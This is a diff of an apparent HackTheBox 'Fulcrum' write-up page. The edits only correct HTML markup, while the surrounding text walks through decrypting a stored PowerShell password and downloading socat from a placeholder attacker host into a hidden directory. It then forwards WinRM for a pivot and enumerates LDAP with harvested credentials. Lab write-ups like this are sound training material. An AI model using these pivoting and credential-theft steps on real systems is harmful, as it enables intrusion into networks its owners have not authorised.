@@ -478,7 +478,8 @@ www-data@Fulcrum:/$ </code></pre></div></div>
 
 <h2 id="getting-shell-on-the-webserver-as-webuser">Getting shell on the webserver as WebUser</h2>
 
-<p>There is an interesting powershell script in /var/www/uploads/Fulcrum_Upload_to_Corp.ps1:
+<p>There is an interesting powershell script in /var/www/uploads/Fulcrum_Upload_to_Corp.ps1:</p>
+
 <div class="bg-ps"><div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">www-data</span><span class="nv">@Fulcrum</span><span class="err">:</span><span class="p">~$</span> <span class="n">cat</span> <span class="p">/</span><span class="n">var</span><span class="p">/</span><span class="n">www</span><span class="p">/</span><span class="n">uploads</span><span class="p">/</span><span class="n">Fulcrum_Upload_to_Corp</span><span class="p">.</span><span class="n">ps1</span>
 <span class="c"># TODO: Forward the PowerShell remoting port to the external interface</span>
 <span class="c"># Password is now encrypted \o/</span>
@@ -489,29 +490,32 @@ www-data@Fulcrum:/$ </code></pre></div></div>
 <span class="nv">$4</span> <span class="p">=</span> <span class="nv">$3</span> <span class="p">|</span> <span class="nb">ConvertTo-SecureString</span> <span class="n">-key</span> <span class="nv">$2</span>
 <span class="nv">$5</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="p">(</span><span class="nv">$1</span><span class="p">,</span> <span class="nv">$4</span><span class="p">)</span>
 
-<span class="nb">Invoke-Command</span> <span class="n">-Computer</span> <span class="n">upload</span><span class="p">.</span><span class="n">fulcrum</span><span class="p">.</span><span class="n">local</span> <span class="n">-Credential</span> <span class="nv">$5</span> <span class="o">-File</span> <span class="n">Data</span><span class="p">.</span><span class="n">ps1</span></code></pre></div></div></p>
+<span class="nb">Invoke-Command</span> <span class="n">-Computer</span> <span class="n">upload</span><span class="p">.</span><span class="n">fulcrum</span><span class="p">.</span><span class="n">local</span> <span class="n">-Credential</span> <span class="nv">$5</span> <span class="o">-File</span> <span class="n">Data</span><span class="p">.</span><span class="n">ps1</span></code></pre></div></div>
 
 <p>Read this: <a href="https://blogs.technet.microsoft.com/heyscriptingguy/2013/03/26/decrypt-powershell-secure-string-password/" target="_blank">https://blogs.technet.microsoft.com/heyscriptingguy/2013/03/26/decrypt-powershell-secure-string-password/</a>
-If we run the above script code we can retrieve the password like this:
+If we run the above script code we can retrieve the password like this:</p>
+
 <div class="bg-ps"><div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">PS</span><span class="p">&gt;</span> <span class="nv">$5</span><span class="p">.</span><span class="n">GetNetworkCredential</span><span class="p">().</span><span class="n">Password</span>
-<span class="n">M4ng</span><span class="err">£</span><span class="n">m</span><span class="err">£</span><span class="n">ntPa55</span></code></pre></div></div></p>
+<span class="n">M4ng</span><span class="err">£</span><span class="n">m</span><span class="err">£</span><span class="n">ntPa55</span></code></pre></div></div>
 
 <p>No need for Windoze. You can run the code online here: <a href="https://tio.run/#powershell" target="_blank">https://tio.run/#powershell</a> (or you can use powershell for linux: <a href="https://github.com/PowerShell/PowerShell" target="_blank">https://github.com/PowerShell/PowerShell</a>).</p>
 
-<p>Now, we know those credentials WebUser:M4ng£m£ntPa55. If we look the file /etc/nginx/sites-enabled/default, we discover an interesting IP address: 192.168.122.228. This IP has port 5986 open (WS-Management a.k.a. WinRM a.k.a PowerShell Remoting). So, let&rsquo;s redirect the port 5986 of 192.168.122.228 to the port 60217 of 10.10.10.62. Then we can access it from outside. I prefer to use socat for this job (you can find it here: <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat" target="_blank">https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat</a>).
+<p>Now, we know those credentials WebUser:M4ng£m£ntPa55. If we look the file /etc/nginx/sites-enabled/default, we discover an interesting IP address: 192.168.122.228. This IP has port 5986 open (WS-Management a.k.a. WinRM a.k.a PowerShell Remoting). So, let&rsquo;s redirect the port 5986 of 192.168.122.228 to the port 60217 of 10.10.10.62. Then we can access it from outside. I prefer to use socat for this job (you can find it here: <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat" target="_blank">https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat</a>).</p>
+
 <div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">www-data@Fulcrum:/$ mkdir /dev/shm/.a
 www-data@Fulcrum:/$ cd /dev/shm/.a
 www-data@Fulcrum:/dev/shm/.a$ wget http://SRVHOST:SRVPORT/socat
 www-data@Fulcrum:/dev/shm/.a$ chmod +x socat
-www-data@Fulcrum:/dev/shm/.a$ ./socat tcp-listen:60217,reuseaddr,fork tcp:192.168.122.228:5986 &amp;</code></pre></div></div></p>
+www-data@Fulcrum:/dev/shm/.a$ ./socat tcp-listen:60217,reuseaddr,fork tcp:192.168.122.228:5986 &amp;</code></pre></div></div>
 
 <p>Now, we can use either Windows Powershell to connect or Ruby&rsquo;s winrm module. To connect from a windows box via my linux system I do a second port redirection like this:</p>
 
 <p>On my linux system I run:
 <div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ socat tcp-listen:5986,reuseaddr,fork tcp:10.10.10.62:60217</code></pre></div></div></p>
 
-<p>On my windows powershell I run:
-<div class="bg-ps"><div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">PS</span><span class="p">&gt;</span> <span class="nb">Enter-PSSession</span> <span class="n">-ComputerName</span> <span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span> <span class="n">-Credential</span> <span class="nv">$5</span> <span class="n">-UseSSL</span> <span class="n">-SessionOption</span> <span class="p">(</span><span class="nb">New-PSSessionOption</span> <span class="n">-SkipCACheck</span> <span class="n">-SkipCNCheck</span><span class="p">)</span></code></pre></div></div></p>
+<p>On my windows powershell I run:</p>
+
+<div class="bg-ps"><div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">PS</span><span class="p">&gt;</span> <span class="nb">Enter-PSSession</span> <span class="n">-ComputerName</span> <span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span> <span class="n">-Credential</span> <span class="nv">$5</span> <span class="n">-UseSSL</span> <span class="n">-SessionOption</span> <span class="p">(</span><span class="nb">New-PSSessionOption</span> <span class="n">-SkipCACheck</span> <span class="n">-SkipCNCheck</span><span class="p">)</span></code></pre></div></div>
 
 <p>where 10.0.0.1 is the gateway for the Windows box i.e. my linux system.</p>
 
@@ -529,7 +533,8 @@ PS webserver\webuser@WEBSERVER Documents&gt;</code></pre></div></div>
 
 <h1 id="getting-ldap-credentials">Getting LDAP credentials</h1>
 
-<p>The file C:\Inetpub\wwwroot\web.config contains some credentials:
+<p>The file C:\Inetpub\wwwroot\web.config contains some credentials:</p>
+
 <div class="bg-ps"><div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">PS</span> <span class="n">webserver</span><span class="p">\</span><span class="n">webuser</span><span class="nv">@WEBSERVER</span> <span class="n">Documents</span><span class="p">&gt;</span> <span class="no">[System.Net.Dns]</span><span class="p">::</span><span class="n">GetHostByName</span><span class="p">((</span><span class="nv">$env:computerName</span><span class="p">))</span>
 
 <span class="n">HostName</span>  <span class="n">Aliases</span> <span class="n">AddressList</span>   
@@ -540,20 +545,21 @@ PS webserver\webuser@WEBSERVER Documents&gt;</code></pre></div></div>
 <span class="n">PS</span> <span class="n">webserver</span><span class="p">\</span><span class="n">webuser</span><span class="nv">@WEBSERVER</span> <span class="n">wwwroot</span><span class="p">&gt;</span> <span class="n">cat</span> <span class="n">web</span><span class="p">.</span><span class="n">config</span>
 <span class="p">...</span>
  <span class="n">connectionUsername</span><span class="p">=</span><span class="s2">&#34;FULCRUM\LDAP&#34;</span> <span class="n">connectionPassword</span><span class="p">=</span><span class="s2">&#34;PasswordForSearching123!&#34;</span>
-<span class="p">...</span></code></pre></div></div></p>
+<span class="p">...</span></code></pre></div></div>
 
 <h2 id="searching-ldap">Searching LDAP</h2>
 
-<p>Let&rsquo;s see what computers we know using an LDAP query:
+<p>Let&rsquo;s see what computers we know using an LDAP query:</p>
+
 <div class="bg-ps"><div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">PS</span> <span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Webuser</span><span class="p">\</span><span class="n">Desktop</span><span class="p">&gt;</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">adsisearcher</span><span class="p">((</span><span class="nb">New-Object</span> <span class="n">adsi</span><span class="p">(</span><span class="s2">&#34;LDAP://dc.fulcrum.local&#34;</span><span class="p">,</span><span class="s2">&#34;fulcrum\ldap&#34;</span><span class="p">,</span><span class="s2">&#34;PasswordForSearching123!&#34;</span><span class="p">)),</span><span class="s2">&#34;(objectCategory=Computer)&#34;</span><span class="p">)).</span><span class="n">FindAll</span><span class="p">()</span> <span class="p">|</span> <span class="p">%{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Properties</span><span class="p">.</span><span class="n">name</span> <span class="p">}</span>
 
 <span class="n">Path</span>                                                                    <span class="n">Properties</span>                                                       
 <span class="p">----</span>                                                                    <span class="p">----------</span>                                                       
 <span class="n">LDAP</span><span class="err">:</span><span class="p">//</span><span class="n">dc</span><span class="p">.</span><span class="n">fulcrum</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">CN</span><span class="p">=</span><span class="n">DC</span><span class="p">,</span><span class="n">OU</span><span class="p">=</span><span class="n">Domain</span> <span class="n">Controllers</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">fulcrum</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">local</span> <span class="p">{</span><span class="n">ridsetreferences</span><span class="p">,</span> <span class="n">logoncount</span><span class="p">,</span> <span class="n">codepage</span><span class="p">,</span> <span class="n">objectcategory</span><span class="p">...}</span>      
-<span class="n">LDAP</span><span class="err">:</span><span class="p">//</span><span class="n">dc</span><span class="p">.</span><span class="n">fulcrum</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">CN</span><span class="p">=</span><span class="n">FILE</span><span class="p">,</span><span class="n">CN</span><span class="p">=</span><span class="n">Computers</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">fulcrum</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">local</span>        <span class="p">{</span><span class="n">logoncount</span><span class="p">,</span> <span class="n">codepage</span><span class="p">,</span> <span class="n">objectcategory</span><span class="p">,</span> <span class="n">iscriticalsystemobject</span><span class="p">...}</span></code></pre></div></p>
+<span class="n">LDAP</span><span class="err">:</span><span class="p">//</span><span class="n">dc</span><span class="p">.</span><span class="n">fulcrum</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">CN</span><span class="p">=</span><span class="n">FILE</span><span class="p">,</span><span class="n">CN</span><span class="p">=</span><span class="n">Computers</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">fulcrum</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">local</span>        <span class="p">{</span><span class="n">logoncount</span><span class="p">,</span> <span class="n">codepage</span><span class="p">,</span> <span class="n">objectcategory</span><span class="p">,</span> <span class="n">iscriticalsystemobject</span><span class="p">...}</span></code></pre></div></div>
 
 <p>We see two CNs: DC and FILE. Now let&rsquo;s query about info:
-<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">PS</span> <span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Webuser</span><span class="p">\</span><span class="n">Desktop</span><span class="p">&gt;</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">adsisearcher</span><span class="p">((</span><span class="nb">New-Object</span> <span class="n">adsi</span><span class="p">(</span><span class="s2">&#34;LDAP://dc.fulcrum.local&#34;</span><span class="p">,</span><span class="s2">&#34;fulcrum\ldap&#34;</span><span class="p">,</span><span class="s2">&#34;PasswordForSearching123!&#34;</span><span class="p">)),</span><span class="s2">&#34;(info=*)&#34;</span><span class="p">)).</span><span class="n">FindAll</span><span class="p">()</span> <span class="p">|</span> <span class="p">%{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Properties</span> <span class="p">}</span>
+<div class="bg-ps"><div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">PS</span> <span class="n">C</span><span class="err">:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Webuser</span><span class="p">\</span><span class="n">Desktop</span><span class="p">&gt;</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">adsisearcher</span><span class="p">((</span><span class="nb">New-Object</span> <span class="n">adsi</span><span class="p">(</span><span class="s2">&#34;LDAP://dc.fulcrum.local&#34;</span><span class="p">,</span><span class="s2">&#34;fulcrum\ldap&#34;</span><span class="p">,</span><span class="s2">&#34;PasswordForSearching123!&#34;</span><span class="p">)),</span><span class="s2">&#34;(info=*)&#34;</span><span class="p">)).</span><span class="n">FindAll</span><span class="p">()</span> <span class="p">|</span> <span class="p">%{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Properties</span> <span class="p">}</span>
 
 <span class="n">Name</span>                           <span class="n">Value</span>
 <span class="p">----</span>                           <span class="p">-----</span>
